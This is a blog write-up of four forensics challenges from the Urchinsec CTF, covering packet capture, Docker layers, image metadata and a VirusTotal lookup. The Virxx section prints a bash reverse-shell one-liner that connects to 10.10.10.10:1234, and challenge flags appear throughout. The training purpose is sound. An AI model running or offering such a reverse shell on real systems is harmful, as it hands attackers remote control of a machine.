---

title: "URCHINSEC CTF MMXXII Forensics WriteUp"
date: 2022-03-09 01:09:33 +0300
author: oste
image: /assets/img/Posts/urchinsec.png
categories: [CTF-TIME]
tags: [wireshark, docker, dive, virus total, Exiftool, forensics, cyberchef]
---

Hey guys and welcome to my blog. Today i will be tackling all challenges i knocked in Urchinsec's CTF. This was a jeopardy type CTF hosted by our competitors, [Urchinsec](https://ctftime.org/team/175663). I majorly focussed on forensics category but attempted some web & OSINT challenges. Special thanks to forensic author, [@tahaafarooq](https://twitter.com/tahaafarooq) and the whole gang for organising the CTF. With that said, lets dive in.

# Streams

> _We were able to capture some packets that we believe to have some information about what the hacker had done after installing a backdoor on our server system , can you figure out what took?_

In this challenge, you are given a packet capture file to figure out what the attacker might have taken. First thing i do when opening a pcap file is look at the `protocal hierarchy statistics` to see what protocols have been used frequently.(_This can be found by navigating to `Statistics > Protocal Hierarchy Statistics`_) In this case, HTTP protocol is a good place to start since traffic is mostly unencrypted. We see that we have some **Line-based text data**. We can right click on it and apply as a filter.

![image](https://user-images.githubusercontent.com/58165365/157321902-267cfd4a-0aeb-4662-82a1-6d5fd677a633.png)

We now have 8 packets which seem to give a clue to what really happened. The attacker abused the `cmd` parameter to execute system commands.

![image](https://user-images.githubusercontent.com/58165365/157341185-23d6f965-5056-49b0-8b4e-4b8fb55f4e73.png)

He run the `id` & `whoami` command to find out who the current user,

![image](https://user-images.githubusercontent.com/58165365/157324053-9c42ee70-ef01-4dce-99e3-07406b5b9c37.png)

`ls` command to list files in the current directory

![image](https://user-images.githubusercontent.com/58165365/157324469-1ee4454b-93a0-48ac-8bd6-7ea69ff647cb.png)

He then read the contents of the flag.

![image](https://user-images.githubusercontent.com/58165365/157320652-b9193064-ed73-425b-8b1e-9c2dc7d68ede.png)

`urchin{wireshark_1s_pr3tty_g00d_f0r_analys!NG}`

# Duck Duck Dock

> _Ashes everywhere , my past has turned into ashes , i'm about to lose it!_

In this challenge, you are given a compressed docker image for analysis. I used a tool called [dive](https://github.com/wagoodman/dive) to analyse the docker image layers before extracting.

> _`dive` is a tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI image._

You can install the tool with this simple one-liner:

`wget https://github.com/wagoodman/dive/releases/download/v0.10.0/dive_0.10.0_linux_amd64.deb && sudo apt install ./dive_0.10.0_linux_amd64.deb`

Run the following command to start `diving`😅

`dive docker-archive://duckdock.tar`

![image](https://user-images.githubusercontent.com/58165365/157329886-5bfe86d0-77c1-4df1-9f43-e378cfa9ca91.png)

From the screenshot above, we can see the compressed docker image has 4 layers. We have a left and right pane. To navigate to the next layer, hit the down arrow key. To switch to the right pane, hit the Tab Key.
In docker forensics we'd be interested to look at the modified or deleted files. In this case, when you switch to the right side and hit `ctrl+u`, you can see modified files in that layer.(_refer to the screenshot below_)

![image](https://user-images.githubusercontent.com/58165365/157331066-384bb238-c8d9-4359-bc01-9520f8e61759.png)

In this case we see we jacob's home directory containing bash_history.

![image](https://user-images.githubusercontent.com/58165365/156884788-e3378f56-0aca-44a8-8333-21d0250219d3.png)

Third layer had a bash script in the `/opt` directory

![image](https://user-images.githubusercontent.com/58165365/157331861-5d8e1c47-afaf-446f-8104-12b5b1e66739.png)

Last layer had a flag in admin's home directory.

![image](https://user-images.githubusercontent.com/58165365/157332015-ad7fbbbd-e959-487f-af34-67166fe9035c.png)

> _I will give you short cut although its always good doing some manual analysis😉_

You can add `-j` parameter to the previous command to write the layer analysis statistics to a given file.

![image](https://user-images.githubusercontent.com/58165365/157333346-e5733f11-fc0c-4aa8-a761-9f6e09999da5.png)

Thats preety much what we found what when manually diving. Take note of the highlighted layer id's as those are the ones we can dig in and understand more about the image.

Since this is a tar file, you can axtract it using the following command:

`tar xvf duckdock.tar`

![image](https://user-images.githubusercontent.com/58165365/157335423-26a1556b-1733-46e8-b5f0-78950e6b618a.png)

Exploring the layer containing bash history, we can see a user being created and deleted, modification of the bash script as well as a hint.🤔 Looking at flag file in admin's home dir, we get more pewpew's 😅

![image](https://user-images.githubusercontent.com/58165365/157336180-b7cc58b9-b59e-4861-9e9c-1391ea0e8892.png)

![image](https://c.tenor.com/OjUxYLxDHqIAAAAC/finger-guns-michael-scott.gif)

Anyway, looking at the layer containing the bash script, we get the flag as a wierd string.

![image](https://user-images.githubusercontent.com/58165365/157336881-1490a2bd-0ae0-4d8d-8c90-8b12157799d5.png)

Using cyberchef to decode it, we get the flag.

![image](https://user-images.githubusercontent.com/58165365/156886314-3b449fb7-5c9f-431c-b75c-2b072aa6cb03.png)

`urchin{d>cker_f>rensics_is_fun}`

# Meta

> _Metaverse, Metadata, Metaphor, blah blah_

In this challenge you are given an image. First thing that comes to mind is doing some steg analysis. Using `exiftool` , you can look at the file metadata to get potentially useful info. Looking at the Artist parameter, i noted an odd string.

![image](https://user-images.githubusercontent.com/58165365/156885645-3abb4422-c7fd-433e-b8cd-fb1ef5c6278c.png)

Using `cyberchef` you can easily identify the string type using the `Magic` module. From there we learn that its hex encoded. Decoding it gives you a flag.

![image](https://user-images.githubusercontent.com/58165365/156885683-75ce3197-effe-407a-b859-bd33d82afecd.png)

`urchin{metadatas_4re_v3ry_int3r3sting_stuff}`

# Virxx

> _This is madness a 0/56 how how how? can you figure out how this happened?_

In this challenge, you are given a file containing some ASCII text. cating the contents of the flag, you get a bash onliner. Tried even running strings on it but got stuck.😪

```bash
➜  file file
file: ASCII text
➜  wc file
 1  6 50 file
➜  cat file
bash -c "bash -i &>/dev/tcp/10.10.10.10/1234 <&1"
➜  strings file
bash -c "bash -i &>/dev/tcp/10.10.10.10/1234 <&1"

```

It took me a while to figure out how to proceed from here. Got a nudge from my team mate [Winter](https://twitter.com/byronchris25) to think about the name of the challenge. `Virustotal`!!! I uploaded the file to [Virustotal](https://www.virustotal.com/gui/file/c995e0dd367fd8d57ac07f528aeea600179be5bd5e193cd31ecfc723e795e02d) and got the flag.😅

![image](https://user-images.githubusercontent.com/58165365/156892643-f1872a9e-4890-4369-b0e9-5a6893efe42f.png)

`urchin{basic_skill_in_mal_analysis}`

Thats it. Hopefully you learnt a thing or two. Generally the CTF was fun and looking foward to their next CTF coming up in Sept. If you have any questions, feel free to ping me on twitter [@oste_ke](https://twitter.com/oste_ke). Till next time, take care and keep safe. 😎
